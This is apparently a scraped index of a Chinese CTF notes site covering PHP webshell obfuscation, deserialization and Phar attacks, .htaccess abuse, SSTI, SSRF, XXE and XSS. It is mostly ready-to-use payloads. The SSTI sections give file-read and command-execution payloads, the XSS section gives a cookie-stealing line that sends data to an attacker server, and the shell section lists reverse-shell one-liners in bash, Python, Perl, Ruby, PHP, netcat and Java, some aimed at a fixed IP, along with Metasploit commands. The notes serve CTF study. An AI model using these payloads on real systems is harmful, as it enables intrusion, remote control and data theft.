#print(\"i=%s j=%s c=%s\"%(i,j,c)) reth=reth+\"%\"+str(hex(ord(i)))[2:] rett=rett+\"%\"+str(hex(ord(j)))[2:] flag=True break ret=reth+\"^\"+rett print ret 白名单异或 $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; $convert = ['decbin','decoct']; foreach($whitelist as $a){ foreach($convert as $b){ for($i=0;$i 异或shell 取反 字符自增 //\"assert\"($_POST[\"_\"]) //$_POST[\"__\"]($_POST[\"_\"]) 还可以用 `` 替代分号逗号 $_=[].[];#$_='ArrayArray' $_=''.[];#$_='Array' “数字”拼接 PHP 中，将两个数字使用.拼接，会当做字符串来处理，返回的也是一个字符串。例如：(1).(2)出来的就是字符串\"12\"，然后可以用{}来代替[]来取单个字符。 $char = '1234567890-INFAH@+*%$()\"!%meogiakcfhvwbnq_'; for($i = 0; $i \"); echo($char[$i] .'|' .$char[$j] . ' '. ($char[$i] | $char[$j])); echo(\"\"); } } sissel师傅写的脚本 \"((1/0).(0)){0}\", \"N\"=>\"((1/0).(0)){1}\", \"F\"=>\"((1/0).(0)){2}\", \"A\"=>\"((0/0).(0)){1}\", \"0\"=>\"((0).(0)){0}\", \"1\"=>\"((1).(0)){0}\", \"2\"=>\"((2).(0)){0}\", \"3\"=>\"((3).(0)){0}\", \"4\"=>\"((4).(0)){0}\", \"5\"=>\"((5).(0)){0}\", \"6\"=>\"((6).(0)){0}\", \"7\"=>\"((7).(0)){0}\", \"8\"=>\"((8).(0)){0}\", \"9\"=>\"((9).(0)){0}\", ); while(true){ for($i = 0; $i 有些字符可能无法利用&|生成，可利用php忽略大小写的特性绕过 无参数读文件 过滤条件 preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp']) ';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['exp']) 利用current(localeconv()) pos(localeconv()) === . POC: show_source(array_rand(array_flip(scandir(current(localeconv()))))); #随机当前读目录下文件 chdir(next(scandir(pos(localeconv()) #chdir(next(scandir(pos(localeconv() echo(readfile(end(scandir()))))))); 参考资料 RoarCTF Web writeup https://github.red/roarctf-web-writeup/ © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/php/serialize.html":{"url":"library/php/serialize.html","title":"Serialize","keywords":"","body":"PHP序列化问题反序列化魔术方法public、protected与private在序列化时的区别__wakeup()方法绕过利用字符逃逸进行非预期反序列Phar 反序列化攻击利用metadata的反序列化利用LFI导入恶意代码绕过绕过字符串头部过滤绕过文件类型监测(文件头)原生类反序列化PHP序列化问题 反序列化魔术方法 __construct()//当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __toString() //当一个对象被当作一个字符串使用 __sleep()//在对象在被序列化之前运行 __wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过) __get()//获得一个类的成员变量时调用 __set()//设置一个类的成员变量时调用 __invoke()//调用函数的方式调用一个对象时的回应方法 __call()//当调用一个对象中的不能用的方法的时候就会执行这个函数 public、protected与private在序列化时的区别 protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\\0\\0的前缀。这里的 \\0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \\0 组合。这也许解释了，为什么如果直接在网址上，传递\\0\\0username会报错，因为实际上并不是\\0，只是用它来代替ASCII值为0的字符。 解决方法 php输出的时候urlencode()或者用python burp等修改hex username = $username; $this->password = $password; } public function __wakeup(){ $this->username = \"guests\"; } public function fun(){ echo $this->username;echo \"\";echo $this->password; } } $a = serialize(new Name(\"admin\",100)); echo $a; ?> O:4:\"Name\":2:{s:11:\"\\0*\\0username\";s:5:\"admin\";s:11:\"\\0*\\0password\";i:100;} private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\\0的前缀。字符串长度也包括所加前缀的长度。其中 \\0 字符也是计算长度的。 可以不看： 这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。 username = $username; $this->password = $password; } public function __wakeup(){ $this->username = \"guests\"; } public function fun(){ echo $this->username;echo \"\";echo $this->password; } } $a = serialize(new Name(\"admin\",100)); echo $a; ?> O:4:\"Name\":2:{s:14:\"\\0Name\\0username\";s:5:\"admin\";s:14:\"\\0Name\\0password\";i:100;} __wakeup()方法绕过 作用： 与__sleep()函数相反，__sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。 绕过： 当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过__wakeup 函数的执行。 上面的代码，序列化后的结果为 要求：PHP5 O:4:\"Name\":2:{s:14:\"\\0Name\\0username\";s:5:\"admin\";s:14:\"\\0Name\\0password\";i:100;} 其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()函数。 O:4:\"Name\":3:{s:14:\"\\0Name\\0username\";s:5:\"admin\";s:14:\"\\0Name\\0password\";i:100;} 利用字符逃逸进行非预期反序列 字符数增加 构造属性向后溢出 字符数减少 类前一个属性吃掉后一个属性的头部结构，使得后续类中的属性完全可控 Example function add($data) { $data = str_replace(chr(0).'*'.chr(0), '\\0*\\0', $data); return $data; } function reduce($data) { $data = str_replace('\\0*\\0', chr(0).'*'.chr(0), $data); return $data; } /* \\0*\\0 -> reduce(add()) -> * 5 -> 3 username=A\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0&password=AB\";s:11:\"\\0*\\0password\";O:8:\"Hacker_A\":1:{S:5:\"c2\\6538\";O:8:\"Hacker_B\":1:{S:5:\"c2\\6538\";O:8:\"Hacker_C\":1:{s:4:\"name\";s:4:\"test\";}}}s:8:\"\\0*\\0admin\";i:1;}&submit=Login */ Phar 反序列化攻击 利用metadata的反序列化 利用函数(涉及到文件操作) fileatime / filectime / filemtimestat / fileinode / fileowner / filegroup / filepermsfile / file_get_contents / readfile / fopen /file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable /parse_ini_file /unlink /copy exif_thumbnail / exif_imagetype / imageloadfont / imagecreatefrom*** / hash_hmac_file / hash_file / hash_update_file / md5_file /sha1_file get_meta_tags /get_headers /getimagesize / getimagesizefromstring /zip 利用LFI导入恶意代码 include(\"phar://exp.phar/eki.css\") startBuffering(); $phar->addFromString('eki.css', ''); $phar->setStub(''); $phar->stopBuffering(); 绕过 绕过字符串头部过滤 demo.php?filename=compress.bzip2://phar://upload_file/shell.gif/a demo.php?filename=compress.zlib://phar://upload_file/shell.gif/a 绕过文件类型监测(文件头) startBuffering(); $phar->addFromString('exp.css', ''); $phar->setStub($png_header . ''); $phar->stopBuffering(); 原生类反序列化 SOAP +CRLF SSRF $target, 'user_agent'=>\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' => \"aaab\")); $payload = urlencode(serialize($attack)); echo $payload; $c = unserialize(urldecode($payload)); $c->b(); Exception alert('xss');/script>\"); $b = serialize($a); $id = $b; print unserialize($id); ZipArchive 利用open函数实现任意文件删除 open('test.zip', ZipArchive::CREATE); if ($res === TRUE) { $zip->addFromString('test.txt', 'file content goes here'); $zip->addFile('data.txt', 'entryname.txt'); $zip->close(); echo 'ok'; } else { echo 'failed'; } //$res = $zip->open('test.zip', ZipArchive::OVERWRITE); ?> © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/php/misc.html":{"url":"library/php/misc.html","title":"Misc","keywords":"","body":"PHP积累PHP 三种写法PHP中的弱类型比较parse_url 绕过一些有用的函数和调用参考资料LFIWrapperinclude参考资料rand() 安全性问题PHP积累 PHP 三种写法 echo (\"这是类似 JavaScript 及 VBScript 语法 的 PHP 语言嵌入范例\"); PHP中的弱类型比较 以下值在MD5加密以0E开头： QNKCDZO 240610708 S878926199a s155964671a s214587387a 以下值在sha1加密之后以0E开头： sha1('aaroZmOk') sha1('aaK1STfy') sha1('aaO8zKZF') sha1('aa3OFF9m') parse_url 绕过 path部分以///开头返回bool(false) 参考资料 浅析无参数rce https://www.cnblogs.com/wangtanzhi/p/12311239.html 一些有用的函数和调用 get_defined_vars() 获取文件中全部变量，包括include eval(end(getallheaders())) 利用HTTP最后的一个header传参 eval(getallheaders(){'a'}) 利用HTTP名为a的header传参 error_reporting(E_ALL); 开启报错 getcwd() 获得当前路径 参考资料 一些不包含数字和字母的webshell： https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html PHP回调后门： https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html php webshell检测与绕过 https://www.smi1e.top/php-webshell%e6%a3%80%e6%b5%8b%e4%b8%8e%e7%bb%95%e8%bf%87/ LFI Wrapper php://filter/convert.base64-encode/resource=index.php include php://input + POST报文php代码 (allow_url_include=On) data://text/plain, (allow_url_include=On) php7 php://filter/string.strip_tags=/etc/passwd 导致php在执行过程中出现segment fault错误，这样如果再此同时上传文件那么临时文件就会被保存在/tmp目录下，不会被删除。 文件名需要爆破/tmp/phpxxxxx session + lfi getshell 参考资料 https://xz.aliyun.com/t/5535#toc-7 php文件包含漏洞： https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/ rand() 安全性问题 php_mt_seed © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/htaccess.html":{"url":"library/htaccess.html","title":"Apache .htaccess","keywords":"","body":".htaccess文件利用正确解析绕过增加使用php解析 (可以类推)利用php_value注入php配置CGI 相关htshell利用lua参考资料.htaccess文件利用 正确解析绕过 .htaccess中出现的无法正常解析的条目时无法生效 \\换行绕过脏字符或绕WAF 利用XMP图片解析头(#刚好是注释符) #define width 1 #define height 1 利用wbmp文件解析头 \\x00\\x00\\x8a\\x39\\x8a\\x39 增加使用php解析 (可以类推) 文件后缀(.jpg) AddType application/x-httpd-php .jpg 的文件 \"> SetHandler application/x-httpd-php 利用php_value注入php配置 在所有php前后注入恶意php文件 php_value auto_prepend_file \"\" php_value auto_append_file \"\" 利用prce参数绕过preg_match php_value pcre.backtrack_limit 0 php_value pcre.jit 0 任意匹配均返回FALSE https://www.php.net/manual/zh/pcre.configuration.php 利用UTF-7编码绕过日志html编码 php_value zend.multibyte 1 php_value zend.script_encoding \"UTF-7\" 利用inclue_path包含恶意文件 php_value include_path \"/tmp\" 利用error log写本地文件 (html编码) php_value error_log /tmp/fl3g.php php_value error_reporting 32767 强制开启短标签 php_value short_open_tag 1 CGI 相关 官方文档 https://httpd.apache.org/docs/2.4/howto/htaccess.html#cgi Finally, you may wish to use a .htaccess file to permit the execution of CGI programs in a particular directory. This may be implemented with the following configuration: Options +ExecCGI AddHandler cgi-script cgi pl htshell 参考链接 https://github.com/wireghoul/htshells/ 利用lua AddHandler lua-script .lua require \"string\" function handle(r) r.content_type = \"text/plain\" if r.method == 'GET' then local a = io.popen('/readflag') local b = a:read(\"*all\") r:puts(b) end return apache2.OK end 参考资料 https://www.hacking8.com/MiscSecNotes/htaccess.html#title-9 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/ssti.html":{"url":"library/ssti.html","title":"SSTI","keywords":"","body":"SSTI 模板注入漏洞（Todo）PythonbypassFlask/Jinja2DjangoTornadoJavaSpringFrameworkJSPFreeMarkerVelocityPHPTwigSmartyBladeRubyERB参考资料SSTI 模板注入漏洞（Todo） Python 基本流程 获取基本类 ''.__class__.__mro__[2] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[8] #jinjia2/flask 适用 [9] 获取基本类后，继续向下获取基本类(object)的子类 object.__subclasses__() 找到重载过的__init__类 在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的 也可以利用.index()去找file,warnings.catch_warnings >>> ''.__class__.__mro__[2].__subclasses__()[99].__init__ >>> ''.__class__.__mro__[2].__subclasses__()[59].__init__ 查看其引用__builtins__ ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__'] 这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file等函数来实现读取文件的功能 ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read() 任意文件读 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %} rce {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %} {% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endif %} {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }} subprocess.Popen fuzz脚本 import requests url = \"http://38ab3221-49f0-415f-98bc-65b4744640b8.node3.buuoj.cn/\" index = 0 for i in range(100, 1000): #print i payload = \"{{''.__class__.__mro__[2].__subclasses__()[%d]}}\" % (i) params = { \"search\": payload } #print(params) req = requests.get(url,params=params) #print(req.text) if \"subprocess.Popen\" in req.text: index = i break print(\"index of subprocess.Popen:\" + str(index)) print(\"payload:{{''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()}}\" % i) bypass Python 字符的几种表示方式 16进制 \\x41 8进制 \\101 base64 'X19jbGFzc19f'.decode('base64') python3 SSTI 获取对象属性的几种方式 class.attr class.__getattribute__('attr') 绕过中括号 pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。 >>> ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read() 在这里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过 过滤引号 request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤 将其中的request.args改为request.values则利用REQUEST的方式进行传参 {{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd 过滤双下划线 同样利用request.args属性 {{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__ GET: {{ ''[request.value.class][request.value.mro][2][request.value.subclasses]()[40]('/etc/passwd').read() }} POST: class=__class__&mro=__mro__&subclasses=__subclasses__ 过滤关键字 base64编码绕过 __getattribute__使用实例访问属性时,调用该方法 例如被过滤掉class关键词 {{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()}} 字符串拼接绕过 {{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}} 同时绕过下划线、与中括号 {{()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)('/etc/passwd')|attr(request.values.name5)()}} post: name1=__class__&name2=__base__&name3=__subclasses__&name4=pop&name5=read 绕过.过滤 Jinja2对模板做了特殊处理,通过A['__init__']也可以访问A的方法/属性 若.也被过滤，使用原生JinJa2函数|attr() 将request.__class__改成request|attr(\"__class__\") 构造字符，绕过强字符检测 #Author：颖奇L'Amore {% set xhx = (({ }|select()|string()|list()).pop(24)|string())%} # _ {% set spa = ((app.__doc__|list()).pop(102)|string())%} #空格 {% set pt = ((app.__doc__|list()).pop(320)|string())%} #点 {% set yin = ((app.__doc__|list()).pop(337)|string())%} #单引号 {% set left = ((app.__doc__|list()).pop(264)|string())%} #左括号 （ {% set right = ((app.__doc__|list()).pop(286)|string())%} #右括号） {% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%} #斜线/ {% set bu = dict(buil=aa,tins=dd)|join() %} #builtins {% set im = dict(imp=aa,ort=dd)|join() %} #import {% set sy = dict(po=aa,pen=dd)|join() %} #popen {% set os = dict(o=aa,s=dd)|join() %} #os {% set ca = dict(ca=aa,t=dd)|join() %} #cat {% set flg = dict(fl=aa,ag=dd)|join() %} #flag {% set ev = dict(ev=aa,al=dd)|join() %} #eval {% set red = dict(re=aa,ad=dd)|join()%} #read {% set bul = xhx*2~bu~xhx*2 %} #__builtins__ #拼接起来 __import__('os').popen('cat /flag').read() {% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} {% for f,v in y1ng.__init__.__globals__.items() %} #globals {% if f == bul %} {% for a,b in v.items() %} #builtins {% if a == ev %} #eval {{b(pld)}} #eval(pld) {% endif %} {% endfor %} {% endif %} {% endfor %} {% print %} 输出 Flask/Jinja2 Django Tornado Java SpringFramework SpEL使用#{...}作为定界符，所有在大括号中的字符都将被认为是 SpEL表达式，我们可以在其中使用运算符，变量以及引用bean，属性和方法如： 引用其他对象:#{car} 引用其他对象的属性：#{car.brand} 调用其它方法 , 还可以链式操作：#{car.toString()} 其中属性名称引用还可以用$符号 如：${someProperty} 除此以外在SpEL中，使用T()运算符会调用类作用域的方法和常量。例如，在SpEL中使用Java的Math类，我们可以像下面的示例这样使用T()运算符： #{T(java.lang.Math)} ${7*7} ${T(java.lang.Runtime).getRuntime().exec('id')} JSP FreeMarker Velocity Exp: %23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%2id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end PHP Twig Smarty 参考资料: https://www.jianshu.com/p/eb8d0137a7d3 Blade Ruby $~:is equivalent to ::last_match; $&:contains the complete matched text; $`:contains string before match; $':contains string after match; $1, $2 and so on contain text matching first, second, etc capture group; $+:contains last capture group. ERB 参考资料 一篇文章带你理解漏洞之SSTI漏洞: https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E 各引擎示例： https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Templates Injections Payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection Bypass姿势： http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/ 参考资料 http://flag0.com/2018/11/11/%E6%B5%85%E6%9E%90SSTI-python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/#%E7%A7%91%E6%9D%A5%E6%9D%AF-easy-flask 浅谈flask ssti绕过原理: https://xz.aliyun.com/t/8029 © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/ssrf.html":{"url":"library/ssrf.html","title":"SSRF","keywords":"","body":"SSRFNodePythonPHP扩展资料SSRF Node Node http存在CRLF注入漏洞 利用unicode截断 \\u{ffa0} => \\a0 Python urllib.request.urlopen() CRLF注入 PHP SOAP CRLF $attack = new SoapClient(null,array('location' => $target, 'user_agent'=>\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' => \"aaab\")); 扩展资料 https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/xxe.html":{"url":"library/xxe.html","title":"XXE","keywords":"","body":"XXE外部实体 (libxml Blind-XXE 引用本地DTDBlind-XXE 引用外部DTD嵌套参数实体except:// PHP扩展协议协议RCE相关cve参考资料XXE 外部实体 (libxml ]> &xxe; Blind-XXE 引用本地DTD 利用 ISOamsa \"> &#x25;eval; &#x25;error; '> %local_dtd; ] Blind-XXE 引用外部DTD XML payload /a.dtd\"> %remote; %send; ]> eki DTD payload \"> %start; 嵌套参数实体 \"> &#x25;para2; '> %para; ]> eki except:// PHP扩展协议协议RCE ]> &xxe; 相关cve CVE-2014-3529 apache poi https://xz.aliyun.com/t/6996#toc-3 CVE-2019-12415 https://b1ue.cn/archives/241.html 参考资料 一篇文章带你深入理解漏洞之 XXE 漏洞 https://xz.aliyun.com/t/3357 Blind XXE详解与Google CTF一道题分析 https://www.freebuf.com/vuls/207639.html DTD Cheat Sheet https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/xss.html":{"url":"library/xss.html","title":"XSS","keywords":"","body":"XSS基本思路iframe图片PNGCSP相关同源策略CheatSheetXSS 基本思路 xss的目的在于前端网页中注入恶意js代码，使得攻击者可以利用访问该网页用户的身份进行恶意操作 可以利用的敏感信息 document.cookie document.location.href top.location.href window.opener.location.href ... 最简单的poc window.open(\"http://your-vps-ip/\"+document.cookie) window.open 可以替换为 window.location.href iframe 图片 PNG 参考链接 https://xz.aliyun.com/t/7530 CSP相关 CSP 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。 CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP 简单的来说CSP就是浏览器在加载网页内外联的其他资源js,css,img等，会检测来源是不是来自可信的域，有效避免恶意插入到网页中的xss被执行 CSP策略通过服务端发送的Content-Security-Policy HTTP头来指定 通过下面的几个示例能够快速理解csp的语法规则 示例 1 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名) Content-Security-Policy: default-src 'self' 示例 2 一个网站管理者允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同) Content-Security-Policy: default-src 'self' *.trusted.com 示例 3 一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码. Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com 在这里，各种内容默认仅允许从文档所在的源获取, 但存在如下例外: 图片可以从任何地方加载(注意 \"*\" 通配符)。 多媒体文件仅允许从 media1.com 和 media2.com 加载(不允许从这些站点的子域名)。 可运行脚本仅允许来自于userscripts.example.com。 示例 4 一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。 Content-Security-Policy: default-src https://onlinebanking.jumbobank.com 该服务器仅允许通过HTTPS方式并仅从onlinebanking.jumbobank.com域名来访问文档。 示例 5 一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容(从任意位置加载)。 Content-Security-Policy: default-src 'self' *.mailsite.com; img-src * 同源策略 如果两个 URL 的 protocol、port (如果有指定的话)和 host 都相同的话，则这两个 URL 是同源。这个方案也被称为“协议/主机/端口元组”，或者直接是 “元组”。（“元组” 是指一组项目构成的整体，双重/三重/四重/五重/等的通用形式）。 CheatSheet Cross-site scripting (XSS) cheat sheet： https://portswigger.net/web-security/cross-site-scripting/cheat-sheet © Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。 all right reserved，powered by Gitbook本网站最后修订于： 2021-05-07 16:30:35 "},"library/shell.html":{"url":"library/shell.html","title":"Shell","keywords":"","body":"Shell几种特殊符号关于反弹shellPHPBypass:BASHPythonPerlRubyJavaNetcatmsf 马获取Bash交互行字符限制绕过绕过cat绕过/readflag一些绕过技巧参考资料Shell 几种特殊符号 反引号 ` 文件重定向符 > 环境变量 ${} 关于反弹shell 通常用于被控端因防火墙受限、权限不足、端口被占用等情形 假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？ 1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 2.它的ip会动态改变，你不能持续控制。 3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。 4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序 PHP 一句话： eval也可以改成system、assert Bypass: 当仅禁用时，可以使用 要求：需要开启短标签开关，short_open_tag 当禁用以及?>时，还可以使用不需要闭合标签 要求：PHP版本>PHP 5.4.0 禁用了时，可以使用asp标签 要求：asp_tags设成On system($_REQUEST['eki']); 等价于 要求：php7之前 命令行反弹Shell php -r '$sock=fsockopen(\"127.0.0.1\",2333);exec(\"/bin/sh -i &3 2>&3\"); curl curl http://127.0.0.1:2333/ -d `ls /`; BASH bash -i >& /dev/tcp/127.0.0.1/233 0>&1 Ex: (自动根据环境来反弹shell) if command -v python > /dev/null 2>&1; then python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"174.1.69.127\",2333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);' exit; fi if command -v perl > /dev/null 2>&1; then perl -e 'use Socket;$i=\"174.1.69.127\";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' exit; fi if command -v nc > /dev/null 2>&1; then rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 174.1.69.127 2333 >/tmp/f exit; fi if command -v sh > /dev/null 2>&1; then /bin/sh -i >& /dev/tcp/174.1.69.127/2333 0>&1 exit; fi Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' Perl perl -e 'use Socket;$i=\"127.0.0.1\";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' Ruby ruby -rsocket -e'f=TCPSocket.open(\"127.0.0.1\",233).to_i;exec sprintf(\"/bin/sh -i &%d 2>&%d\",f,f,f)' Java java的shell需要一些奇怪的姿势 /bin/sh -c '$@|sh' xxx echo ls -> ls Runtime.getRuntime().exec(\"bash -c {echo,}|{base64,-d}|{bash,-i}\"); Runtime.getRuntime().exec(\"/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xx.xx.xx.xx/9999 0>&1\"); Runtime.getRuntime().exec(\"/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/xx.xx.xx.xx/8888 Netcat nc -e /bin/sh 127.0.0.1 2333 正向弹 靶机： nc -lvvp 2333 -e /bin/bash 攻击机 nc ip 2333 msf 马 msfvenom -p linux/x86/meterpreter/reverse_tcp lhost={IP} lport={PORT} -f elf -o shell msfconsole use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost 192.168.187.130 set lport 4444 exploit 获取Bash交互行 python -c \"import pty;pty.spawn('/bin/bash')\" 字符限制绕过 以hackme为例 import requests from time import sleep from urllib import quote import base64 payload = [ # generate \"g> ht- sl\" to file \"v\" '>dir', '>sl', '>g\\>', '>ht-', '*>v', # reverse file \"v\" to file \"x\", content \"ls -th >g\" '>rev', '*v>x', # generate \"curl | ba sh;\" # '>\\;', '>sh\\\\', '>ba\\\\', '>\\|\\\\', '>XX\\\\', '>XX\\\\', '>XX\\\\', 